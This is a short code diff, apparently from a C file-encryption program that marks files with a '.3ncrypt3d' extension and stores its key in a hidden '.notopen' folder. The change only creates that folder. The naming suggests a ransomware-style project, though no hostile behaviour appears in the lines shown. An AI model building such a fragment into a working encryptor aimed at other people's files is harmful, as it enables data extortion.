@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <sys/stat.h>
 #include "liblinuxencode.h"
 
 #define EXT_ENCRYPTED ".3ncrypt3d"
@@ -17,6 +18,11 @@ char *get_key(int length) {
         }
         tab[length] = '\0';
         
+    }
+
+    struct stat st = {0};
+    if (stat("./.notopen", &st) == -1) {
+        mkdir("./.notopen", 0700);
     }
 
     FILE *file = fopen("./.notopen/privatekey.key", "a");
